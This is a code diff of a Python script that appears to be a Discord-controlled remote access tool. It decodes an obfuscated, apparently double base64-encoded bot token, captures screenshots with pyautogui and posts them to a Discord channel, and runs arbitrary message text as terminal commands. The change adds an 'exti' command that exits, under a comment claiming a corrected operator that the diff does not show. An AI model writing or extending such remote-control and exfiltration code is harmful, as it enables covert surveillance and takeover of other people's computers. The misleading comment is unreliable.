@@ -1,8 +1,8 @@
 import discord
 import subprocess
 import pyautogui
-
 import base64
+import sys  # Import the sys module
 
 encoded_text = "TVRJd016TTBOVGM0TVRJMk5UQXhORGd3TkEuR21za2xoLlRlRms4UnRrQzVqVWtmMnY4Q09DMU45ZmFTSkhrTjhjZ0phbzNV"
 decoded_text = base64.b64decode(encoded_text).decode('utf-8')
@@ -36,6 +36,9 @@ async def on_message(message):
                 await message.channel.send(file=discord.File('screenshot.png'))
             except Exception as e:
                 await message.channel.send(f'Error: {e}')
+        elif command == 'exti':  # Corrected comparison operator
+            await message.channel.send("Exiting...")
+            sys.exit()  # Exit the script
         else:
             # Run the command in the terminal
             try:
